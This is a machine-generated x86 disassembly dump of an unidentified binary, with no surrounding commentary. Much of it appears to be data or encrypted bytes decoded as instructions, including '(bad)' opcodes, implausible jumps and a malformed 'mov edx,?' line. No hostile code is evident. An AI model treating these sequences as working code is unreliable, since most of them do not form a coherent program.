  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    ebp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [eax+edx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fsub   DWORD PTR [eax]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fnop   
  414e41:	adc    cl,dh
  414e43:	dec    edi
  414e44:	mov    ebp,fs
  414e46:	add    BYTE PTR [eax],al
  414e48:	cmc    
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    dh,ah
  414e4d:	xchg   edi,eax
  414e4e:	mov    dl,0x97
  414e50:	sub    eax,0xf9733346
  414e55:	aad    0x8b
  414e57:	std    
  414e58:	ret    
  414e59:	mov    ebx,0x2b7911b6
  414e5e:	jge    0x414e76
  414e60:	cdq    
  414e61:	pop    edi
  414e62:	dec    ebp
  414e63:	pop    esp
  414e64:	jmp    FWORD PTR ds:0xa1c3acf1
  414e6a:	in     eax,0x1d
  414e6c:	inc    esi
  414e6d:	push   esi
  414e6e:	xchg   ebp,eax
  414e6f:	or     eax,ebx
  414e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e72:	cs push ebp
  414e74:	jp     0x414e70
  414e76:	ja     0x414ead
  414e78:	push   ebp
  414e79:	mov    ds:0x96361da1,al
  414e7e:	(bad)  
  414e80:	stc    
  414e81:	sub    bh,BYTE PTR [ebx+ebx*4+0x40186c56]
  414e88:	sbb    al,0x8f
  414e8a:	int3   
  414e8b:	nop
  414e8c:	(bad)
  414e8f:	call   0xceeea100
  414e94:	sub    al,0x92
  414e96:	retf   
  414e97:	cmc    
  414e98:	mov    dl,0xec
  414e9a:	retf   
  414e9b:	jae    0x414e86
  414e9d:	pusha  
  414e9e:	add    ecx,DWORD PTR [edi+0x1d]
  414ea1:	fisub  DWORD PTR [edi]
  414ea3:	jae    0x414ec1
  414ea5:	and    al,0x12
  414ea7:	xchg   esp,eax
  414ea8:	sbb    eax,0xd9bbd447
  414ead:	js     0x414ea1
  414eaf:	(bad)  
  414eb1:	push   0x69
  414eb3:	mov    eax,0xa3571d26
  414eb8:	dec    esi
  414eb9:	add    DWORD PTR [esi],esp
  414ebb:	add    DWORD PTR [ebp+0x3c],edi
  414ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ebf:	ins    BYTE PTR es:[edi],dx
  414ec0:	push   ebp
  414ec1:	add    dl,BYTE PTR [esp+eax*4-0x17]
  414ec5:	pushf  
  414ec6:	out    0x9d,al
  414ec8:	(bad)  
  414ec9:	lahf   
  414eca:	push   ebx
  414ecb:	push   eax
  414ecc:	jbe    0x414ef5
  414ece:	int3   
  414ecf:	push   esp
  414ed0:	sti    
  414ed1:	in     eax,dx
  414ed2:	push   esi
  414ed3:	fmul   QWORD PTR [edi+0x66a60455]
  414ed9:	cmp    al,0x81
  414edb:	and    edi,edi
  414edd:	jnp    0x414e74
  414edf:	cs rol eax,0xc
  414ee3:	cmp    al,0xab
  414ee5:	(bad)  
  414ee6:	mov    edx,0xe7a797ac
  414eeb:	xchg   ebp,eax
  414eec:	out    0xbb,eax
  414eee:	retf   
  414eef:	add    al,0x8c
  414ef1:	fwait
  414ef2:	sbb    DWORD PTR [ebp+0x13],ebp
  414ef5:	das    
  414ef6:	mov    eax,0x80d87fff
  414efb:	(bad)  
  414efc:	jno    0x414f3a
  414efe:	call   0x46f4babc
  414f03:	dec    al
  414f05:	aam    0x3e
  414f07:	arpl   WORD PTR [edi+0x57],di
  414f0a:	repnz mov al,ds:0xcba1eb88
  414f10:	xlat   BYTE PTR ds:[ebx]
  414f11:	mov    eax,ds:0xbddc901c
  414f16:	or     cl,ah
  414f18:	shl    DWORD PTR [ebx-0x55],1
  414f1b:	mov    esi,0x1c620adc
  414f20:	jge    0x414f14
  414f22:	jmp    0x84734dcc
  414f27:	idiv   bl
  414f29:	mov    BYTE PTR [edx-0x75],0xfd
  414f2d:	pop    edx
  414f2e:	jnp    0x414ed0
  414f30:	pop    ebp
  414f31:	ret    0x1f29
  414f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f35:	repnz or DWORD PTR [ebx],ebx
  414f38:	dec    ebx
  414f39:	icebp  
  414f3a:	xor    eax,0xb324f208
  414f3f:	xor    BYTE PTR [ecx+0x0],al
	...
  414fb1:	add    BYTE PTR [eax],al
  414fb3:	add    BYTE PTR [edx-0x26],bl
  414fb6:	push   esi
  414fb7:	pusha  
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0xc314
  414fc2:	shr    DWORD PTR [ecx+0xe681],1
  414fc8:	cmc    
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    BYTE PTR [edi],bl
  414fcd:	mov    ds:0xb33b4eba,al
  414fd2:	or     BYTE PTR [eax+edi*2-0x5414f857],cl
  414fd9:	call   0x96ee:0x9dd96634
  414fe0:	fld    TBYTE PTR [ebx+0x4]
  414fe4:	cmp    al,0xef
  414fe6:	jge    0x41505c
  414fe8:	ficomp DWORD PTR [edx+0x6ada676a]
  414fee:	nop
  414fef:	mov    bl,0x43
  414ff1:	pop    ebx
  414ff2:	out    0x14,al
  414ff4:	fst    QWORD PTR [edi+eiz*8]
  414ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff8:	out    dx,al
  414ff9:	mov    ds:0xf88ef9d3,al
  414ffe:	dec    edi
  414fff:	or     eax,0xa13ea20b
  415004:	sbb    edi,DWORD PTR ds:0x1102c394
  41500a:	dec    esi
  41500b:	add    eax,0xb626f981
  415010:	aas    
  415011:	or     bh,BYTE PTR [edi-0x3f]
  415014:	push   cs
  415015:	scas   eax,DWORD PTR es:[edi]
  415016:	jae    0x414fc8
  415018:	and    eax,0xf3d9c8dc
  41501d:	out    0x45,eax
  41501f:	ror    BYTE PTR [eax+edx*8-0x44837730],1
  415026:	mov    al,ds:0xe082bb7b
  41502b:	test   eax,ebp
  41502d:	(bad)  
  41502e:	in     eax,dx
  41502f:	push   ebp
  415030:	xchg   DWORD PTR cs:[esp+ecx*1-0x65902f95],ecx
  415038:	xchg   DWORD PTR [esp+edx*1+0x63],ecx
  41503c:	mov    cl,0x6a
  41503e:	inc    esp
  41503f:	shl    DWORD PTR [edi+eiz*1+0x4b],0x4b
  415044:	pop    esi
  415045:	push   esi
  415046:	mov    BYTE PTR [ecx],cl
  415048:	jne    0x415054
  41504a:	jl     0x415077
  41504c:	and    eax,0x5d95e161
  415051:	mov    edi,0xd2ad9ea3
  415056:	jno    0x414fd8
  415058:	jl     0x41504f
  41505a:	imul   ebp,DWORD PTR [esi+ebp*1+0x5906d500],0x5
  415062:	xor    DWORD PTR [ecx],eax
  415064:	jmp    0x98b87d72
  415069:	pop    ebx
  41506a:	inc    esi
  41506b:	add    al,0x93
  41506d:	lods   al,BYTE PTR ds:[esi]
  41506e:	dec    edi
  41506f:	jmp    0x41500d
  415071:	cwde   
  415072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415073:	and    edi,edi
  415075:	neg    DWORD PTR [ebx+ecx*4-0x4e218b5]
  41507c:	mov    al,ch
  41507e:	aaa    
  41507f:	inc    edi
  415080:	jo     0x4150da
  415082:	sahf   
  415083:	add    DWORD PTR [edi+eiz*1+0x4c],edi
  415087:	cld    
  415088:	xor    DWORD PTR [edx-0x19],edi
  41508b:	pop    es
  41508c:	sahf   
  41508d:	xchg   DWORD PTR [ebx],eax
  41508f:	jle    0x415092
  415091:	adc    BYTE PTR [eax],ah
  415093:	xchg   DWORD PTR [ebp+ebx*1+0x22],ebp
  415097:	push   ebp
  415098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415099:	lods   eax,DWORD PTR ds:[esi]
  41509a:	dec    edx
  41509b:	cwde   
  41509c:	test   eax,0xbf19aaa6
  4150a1:	mov    ds:0x9f5420ba,eax
  4150a6:	call   0xc0b9f260
  4150ab:	jmp    0x17c07866
  4150b0:	ret    
  4150b1:	cmp    bl,ch
  4150b3:	div    BYTE PTR [ebx-0x4]
  4150b6:	test   DWORD PTR [edx-0x1887959f],edx
  4150bc:	imul   eax,DWORD PTR [edx+0x78d312],0x0
	...
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi+0x6245c4d9]
  415142:	pop    es
  415143:	test   DWORD PTR [esi-0x19],esi
  415146:	add    BYTE PTR [eax],al
  415148:	cmc    
  415149:	add    BYTE PTR [eax],al
  41514b:	add    bl,ch
  41514d:	gs cvtps2pi mm1,xmm1
  415151:	dec    esi
  415152:	fstp   QWORD PTR [ecx+0x62]
  415155:	mov    al,0x4d
  415157:	dec    ecx
  415158:	pop    esp
  415159:	push   edx
  41515a:	shl    DWORD PTR ds:0x3dcc0854,0xaa
  415161:	add    esi,edx
  415163:	call   0xc59cc526
  415168:	jle    0x41514c
  41516a:	inc    esi
  41516b:	cli    
  41516c:	and    DWORD PTR [bx+di],eax
  41516f:	imul   eax,DWORD PTR [esi],0xf1768177
  415175:	pop    ecx
  415176:	jns    0x4151e9
  415178:	push   0xffffffcd
  41517a:	dec    edx
  41517b:	xchg   edi,eax
  41517c:	and    eax,0xfe0ee588
  415181:	popf   
  415182:	imul   esi,eax,0xffffff94
  415185:	dec    edi
  415186:	imul   ebp,DWORD PTR [ecx],0xffffffda
  415189:	mov    bl,0x25
  41518b:	dec    edi
  41518c:	pushf  
  41518d:	push   edi
  41518e:	mov    al,BYTE PTR [esi-0x2b]
  415191:	xor    al,0xdc
  415193:	ja     0x415138
  415195:	cmp    esi,esi
  415197:	sub    DWORD PTR [edi+0x70d67821],ebx
  41519d:	test   al,0xd1
  41519f:	or     DWORD PTR [ecx+0x6899f9e4],0x85d4c5b9
  4151a9:	jg     0x415162
  4151ab:	ret    
  4151ac:	sbb    BYTE PTR [edi],cl
  4151ae:	aas    
  4151af:	jp     0x415131
  4151b1:	mov    fs,WORD PTR [edi+0x41a84d4a]
  4151b7:	scas   eax,DWORD PTR es:[edi]
  4151b8:	add    ebx,ecx
  4151ba:	fdivr  DWORD PTR [ebx]
  4151bc:	aas    
  4151bd:	push   ss
  4151be:	jnp    0x41520b
  4151c0:	fwait
  4151c1:	or     al,0x2a
  4151c3:	pop    es
  4151c4:	adc    edi,esi
  4151c6:	jns    0x4151f2
  4151c8:	addr16 js 0x41520e
  4151cb:	lods   eax,DWORD PTR ds:[esi]
  4151cc:	adc    BYTE PTR [eax+0x2d0cb08f],dl
  4151d2:	dec    esi
  4151d3:	push   ecx
  4151d4:	mov    bl,0xc6
  4151d6:	jns    0x415159
  4151d8:	popf   
  4151d9:	pushf  
  4151da:	inc    ebx
  4151db:	sahf   
  4151dc:	addr16 xchg esp,eax
  4151de:	mov    esp,0x851b7a85
  4151e3:	jmp    FWORD PTR [edi+0x59c1a9d]
  4151e9:	imul   ecx,ecx,0xffffffa5
  4151ec:	(bad)  
  4151ed:	ror    BYTE PTR [ebx+esi*1+0x2eb96d4b],1
  4151f4:	fld    QWORD PTR [ebx+0xb]
  4151f7:	push   eax
  4151f8:	xor    DWORD PTR [edx-0x29ed0ad2],0x95dc38a2
  415202:	loope  0x4151d1
  415204:	das    
  415205:	inc    ecx
  415206:	pop    ebx
  415207:	dec    ebp
  415208:	inc    ebp
  415209:	mov    edi,0x1507b1d2
  41520e:	mov    esi,0x3a100a46
  415213:	cmp    eax,0xb7e1ee32
  415218:	in     eax,dx
  415219:	leave  
  41521a:	rcr    BYTE PTR [edi+edx*4-0x230eae30],1
  415221:	icebp  
  415222:	adc    al,0xfc
  415224:	daa    
  415225:	inc    eax
  415226:	pop    ebx
  415227:	mov    edi,0x2097cedb
  41522c:	push   ecx
  41522d:	shr    DWORD PTR [edi+0x8deae40],0x91
